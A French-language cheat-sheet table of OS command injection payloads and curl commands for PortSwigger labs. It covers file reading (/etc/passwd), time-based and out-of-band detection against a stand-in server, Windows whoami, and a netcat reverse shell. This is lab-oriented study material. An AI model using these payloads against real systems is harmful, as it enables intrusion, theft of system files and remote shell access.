# OS Injection

Voici un tableau synthétique pour l’analyse et la découverte des failles d’injection OS (OS Command Injection) sur les labs PortSwigger, **avec des commandes curl différenciées pour l’attaque et l’analyse** selon chaque cas, des charges utiles neutres, et des explications claires en français :

| Type / Lab                                 | Payload d’attaque neutre (exemple)        | Commande d’attaque (curl)                                                                                 | Commande(s) d’analyse curl                                                                                 | Élément d’analyse (raison préalable)                   | Méthodologie détaillée de découverte                                                                                   | URL PortSwigger ou source utile                                      |
|---------------------------------------------|-------------------------------------------|-----------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------|--------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------|
| Injection OS basique (réponse visible)      | ;cat /etc/passwd                          | curl -G --data-urlencode "input=valeur;cat /etc/passwd" https://LAB/vuln                                  | curl -G --data-urlencode "input=valeur" https://LAB/vuln                                                   | Affichage du contenu d’un fichier système              | Injectez un séparateur de commande suivi d’une commande système. Comparez la réponse avec celle d’une requête neutre. Si le contenu du fichier apparaît, la faille est confirmée. | https://portswigger.net/web-security/os-command-injection/lab-simple |
| Injection OS aveugle (time-based)           | ;sleep 5                                  | curl -G --data-urlencode "input=valeur;sleep 5" https://LAB/vuln --max-time 10 -w "%{time_total}\n"       | curl -G --data-urlencode "input=valeur" https://LAB/vuln --max-time 10 -w "%{time_total}\n"                | Temps de réponse anormalement long                     | Injectez une commande qui provoque un délai (sleep). Comparez le temps de réponse avec une requête neutre. Un délai anormal indique une injection OS aveugle. | https://portswigger.net/web-security/os-command-injection/lab-blind-time-delay |
| Injection OS avec interaction externe        | ;curl http://votre-serveur.com/collect    | curl -G --data-urlencode "input=valeur;curl http://votre-serveur.com/collect" https://LAB/vuln            | Surveillez les logs ou requêtes sur votre serveur externe (tcpdump, Burp Collaborator, logs web)           | Détection d’une requête sur votre serveur externe      | Injectez une commande qui force le serveur à contacter une URL que vous contrôlez. Surveillez votre serveur pour détecter une connexion sortante (preuve d’exécution de la commande). | https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band |
| Injection OS Windows (PowerShell)            | &whoami                                  | curl -G --data-urlencode "input=valeur&whoami" https://LAB/vuln                                           | curl -G --data-urlencode "input=valeur" https://LAB/vuln                                                   | Affichage du nom d’utilisateur système Windows         | Injectez une commande Windows typique (par exemple, whoami). Si le résultat s’affiche dans la réponse, la faille est présente côté Windows. | https://portswigger.net/web-security/os-command-injection/lab-windows |
| Injection OS avancée (reverse shell)         | ;nc -e /bin/sh votre-ip 4444              | curl -G --data-urlencode "input=valeur;nc -e /bin/sh votre-ip 4444" https://LAB/vuln                      | Surveillez votre listener netcat : nc -lvp 4444                                                            | Ouverture d’un shell distant sur votre machine         | Injectez une commande lançant un reverse shell vers votre machine. Si vous obtenez un shell sur votre listener, la faille est confirmée. | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/OS%20Command%20Injection/README.md |
| Injection OS filtrée (test argument)         | ;echo testinjection                       | curl -G --data-urlencode "input=valeur;echo testinjection" https://LAB/vuln                               | curl -G --data-urlencode "input=valeur" https://LAB/vuln                                                   | Affichage d’une chaîne arbitraire dans la réponse      | Injectez une commande inoffensive (echo). Si la chaîne apparaît dans la réponse, la faille est présente même si les commandes critiques sont filtrées. | https://portswigger.net/web-security/os-command-injection/lab-filtered |

---

